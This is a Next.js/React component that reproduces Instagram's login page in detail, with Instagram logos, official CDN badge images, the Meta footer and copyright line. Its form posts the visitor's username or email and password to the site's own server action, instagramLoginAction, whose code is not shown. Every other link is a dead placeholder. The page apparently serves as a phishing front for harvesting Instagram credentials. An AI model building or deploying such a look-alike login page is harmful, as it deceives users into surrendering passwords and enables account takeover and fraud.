import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Facebook } from "lucide-react";
import Image from "next/image";
import Link from "next/link";
import { instagramLoginAction } from "@/app/actions";

export default function InstagramLoginPage() {
    return (
        <main className="flex min-h-screen w-full flex-col items-center justify-center bg-[#FAFAFA] pt-8">
            <div className="flex w-full max-w-[935px] flex-wrap items-center justify-center">
                <div className="hidden basis-1/2 justify-end pr-8 md:flex">
                    <div className="relative h-[581px] w-[380px]">
                        <Image
                            src="/landing-3x.png"
                            alt="Instagram phones"
                            width={400}
                            height={581}
                            priority
                            data-ai-hint="phone screen"
                            className="h-[450px] w-[400] "
                        />
                    </div>
                </div>
                <div className="flex w-full max-w-[350px] basis-full flex-col md:basis-1/2">
                    <div className="border border-[#dbdbdb] bg-white p-10 text-center">
                        <div className="flex justify-center">
                            <Image
                                src="/images.jpg"
                                alt="Instagram"
                                width={175}
                                height={51}
                                priority
                            />
                        </div>
                        <form className="mt-6" action={instagramLoginAction}>
                            <div className="space-y-2">
                                <Input
                                    type="text"
                                    placeholder="Phone number, username, or email"
                                    id="email"
                                    name="email"
                                    required
                                    className="h-9 bg-[#FAFAFA] text-[12px] border-[#dbdbdb]"
                                />
                                <Input
                                    type="password"
                                    placeholder="Password"
                                    id="password"
                                    name="password"
                                    required
                                    className="h-9 bg-[#FAFAFA] text-[12px] border-[#dbdbdb]"
                                />
                            </div>
                            <Button
                                type="submit"
                                className="mt-4 h-8 w-full bg-[#0095F6] hover:bg-[#1877F2] text-white font-semibold"
                            >
                                Log In
                            </Button>
                        </form>
                        <div className="my-4 flex items-center">
                            <div className="h-px flex-grow bg-[#dbdbdb]" />
                            <div className="px-4 text-xs font-semibold text-[#8e8e8e]">
                                OR
                            </div>
                            <div className="h-px flex-grow bg-[#dbdbdb]" />
                        </div>
                        <Button variant="link" className="p-0 text-sm font-semibold text-[#385185]">
                            <Facebook className="mr-2 h-4 w-4 fill-current" />
                            Log in with Facebook
                        </Button>
                        <p className="mt-4 text-xs">
                            <Link href="#" className="text-[#00376B]">
                                Forgot password?
                            </Link>
                        </p>
                    </div>
                    <div className="mt-2.5 border border-[#dbdbdb] bg-white p-4 text-center text-sm">
                        <p>
                            Don&apos;t have an account?{" "}
                            <Link href="#" className="font-semibold text-blue-500">
                                Sign up
                            </Link>
                        </p>
                    </div>
                    <div className="mt-5 text-center text-sm">
                        <p>Get the app.</p>
                        <div className="mt-4 flex justify-center gap-2">
                            <Link href="#">
                                <Image
                                    src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"
                                    alt="Download on the App Store"
                                    width={136}
                                    height={40}
                                />
                            </Link>
                            <Link href="#">
                                <Image
                                    src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"
                                    alt="Get it on Google Play"
                                    width={136}
                                    height={40}
                                />
                            </Link>
                        </div>
                    </div>
                </div>
            </div>
            <footer className="mt-12 w-full max-w-5xl px-4 pb-8 text-center text-xs text-[#8e8e8e]">
                <div className="flex flex-wrap justify-center gap-x-4 gap-y-2">
                    <Link href="#">Meta</Link>
                    <Link href="#">About</Link>
                    <Link href="#">Blog</Link>
                    <Link href="#">Jobs</Link>
                    <Link href="#">Help</Link>
                    <Link href="#">API</Link>
                    <Link href="#">Privacy</Link>
                    <Link href="#">Terms</Link>
                    <Link href="#">Locations</Link>
                    <Link href="#">Instagram Lite</Link>
                    <Link href="#">Threads</Link>
                    <Link href="#">Contact Uploading & Non-Users</Link>
                    <Link href="#">Meta Verified</Link>
                </div>
                <div className="mt-4">
                    <span>English</span>
                    <span className="ml-4">© 2024 Instagram from Meta</span>
                </div>
            </footer>
        </main>
    );
}
